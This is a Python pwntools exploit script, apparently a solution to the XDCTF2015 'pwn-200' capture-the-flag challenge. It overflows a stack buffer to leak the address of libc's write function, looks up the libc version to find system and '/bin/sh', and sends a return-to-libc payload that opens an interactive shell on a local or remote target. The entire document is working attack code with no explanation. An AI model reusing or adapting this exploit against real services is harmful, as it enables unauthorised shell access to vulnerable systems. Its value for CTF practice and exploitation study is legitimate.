#!/usr/bin/env python3

from pwn import *
from LibcSearcher import *

context(os="linux", arch="i386", log_level="debug")
localfile = "./pwn-200"
locallibc = ""


def exp():
    # payload = b"A"*0x70 + p32(elf.plt["setbuf"]) + p32(0x80484be) + p32(0x804A040) + p32(0)
    # io.sendlineafter("Welcome to XDCTF2015~!\n", payload)

    payload = b"A"*0x70 + p32(elf.plt["write"]) + p32(0x80484be) + p32(1) + p32(elf.got["write"]) + p32(4)
    io.sendlineafter("Welcome to XDCTF2015~!\n", payload)

    write_addr = u32(io.recv(4))
    log.info("write addr: 0x%x" % write_addr)

    libc = LibcSearcher("write", write_addr)
    libc_base = write_addr - libc.dump("write")
    system_addr = libc.dump("system") + libc_base
    binsh_addr = libc.dump("str_bin_sh") + libc_base

    payload = b"A"*0x70 + p32(system_addr) + p32(0xdeadbeef) + p32(binsh_addr)
    io.sendlineafter("Welcome to XDCTF2015~!\n", payload)

    io.interactive()


argc = len(sys.argv)
if argc == 1:
    io = process(localfile)
else:
    if argc == 2:
        host, port = sys.argv[1].split(":")
    elif argc == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    io = remote(host, port)

elf = ELF(localfile)
exp()
